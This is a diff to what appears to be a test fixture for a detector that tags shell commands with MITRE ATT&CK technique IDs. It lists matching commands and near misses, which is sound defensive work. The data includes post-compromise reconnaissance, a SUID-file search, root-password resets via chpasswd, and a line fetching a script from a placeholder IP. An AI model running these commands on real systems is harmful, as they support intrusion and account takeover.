@@ -19,11 +19,32 @@ techniques:
       - 'lscpu'
       - 'cat /etc/os-release'
       - 'echo "$(nproc)"'
+      - '/bin/./uname -a'
+      - '/./usr/./bin/./uname -r'
+      - 'hostname'
+      - 'uptime'
+      - 'free -m'
+      - 'df -h'
+      - 'lsmod'
+      - 'getconf LONG_BIT'
+      - 'env'
+      - 'env | grep PATH'
+      - 'mount'
+      - 'cat /etc/*release'
+      - 'cat /etc/redhat-release'
+      - 'cat /etc/debian_version'
     near_misses:
       - 'cat /tmp/uname.txt'
       - 'unamex -a'
       - 'echo uname'
       - 'ls /proc'
+      - './uname -a'
+      - '/bin/../uname'
+      - 'echo hostname'
+      - 'env -i bash'
+      - 'mount /dev/sdb1 /mnt'
+      - 'cat /etc/passwd'
+      - 'dfx'
 
   T1033:
     hits:
@@ -31,11 +52,54 @@ techniques:
       - 'echo $(id -u)'
       - 'sudo who'
       - 'id'
+      - 'w'
+      - '/usr/bin/./who'
     near_misses:
       - 'cat ~/.ssh/id_rsa.pub'
       - 'echo whoami'
       - 'idle'
       - 'ls -la /home/who'
+      - 'whois beispiel[.]test'
+      - 'wc -l x.txt'
+      - 'echo w'
+
+  T1049:
+    hits:
+      - 'netstat -tulpn'
+      - 'ss -antp'
+      - 'sudo /bin/./netstat -an | grep 22'
+    near_misses:
+      - 'ssh -V'
+      - 'cat netstat.txt'
+      - 'echo ss'
+      - 'sshd -T'
+
+  T1016:
+    hits:
+      - 'ifconfig'
+      - '/sbin/ifconfig -a'
+      - 'ip a'
+      - 'ip -4 -o addr show'
+      - 'ip route'
+      - 'ip -br address'
+    near_misses:
+      - 'ipcs -a'
+      - 'echo ip addr'
+      - 'ip link'
+      - 'pip install x'
+      - 'cat ifconfig.txt'
+
+  T1098:
+    hits:
+      - 'echo "root:PLATZHALTER" | chpasswd'
+      - 'echo -e "PLATZHALTER\nPLATZHALTER" | passwd'
+      - 'echo PLATZHALTER | sudo passwd root'
+      - 'chpasswd < /tmp/p'
+    near_misses:
+      - 'passwd'
+      - 'cat /etc/passwd | grep root'
+      - 'true || passwd'
+      - 'passwd -S root'
 
   T1098.004:
     hits:
@@ -113,6 +177,21 @@ techniques:
       - 'echo $HISTFILE'
       - 'echo x >> ~/.bash_history'
 
+  T1083:
+    hits:
+      - 'ls -la /'
+      - 'ls /etc/'
+      - 'ls -la /tmp /root'
+      - 'ls -lah /var'
+      - 'find / -perm -4000 -type f'
+      - 'locate authorized_keys'
+    near_misses:
+      - 'ls -la'
+      - 'ls /tmp/x.sh'
+      - 'ls -la /opt/app'
+      - 'findmnt'
+      - 'echo find'
+
 multi:
   - command: 'uname -a; whoami; wget hxxp://198[.]51[.]100[.]7/x.sh'
     expect: [T1033, T1082, T1105]
@@ -122,3 +201,7 @@ multi:
     expect: [T1053.003, T1070.003, T1105]
   - command: 'cat /proc/cpuinfo | grep name | head -n 1; ps aux | grep -v grep; id'
     expect: [T1033, T1057, T1082]
+  - command: 'uname -a; ip a; netstat -tulpn; ls -la /root; w'
+    expect: [T1016, T1033, T1049, T1082, T1083]
+  - command: 'echo "root:PLATZHALTER" | chpasswd; cat /etc/*release'
+    expect: [T1082, T1098]
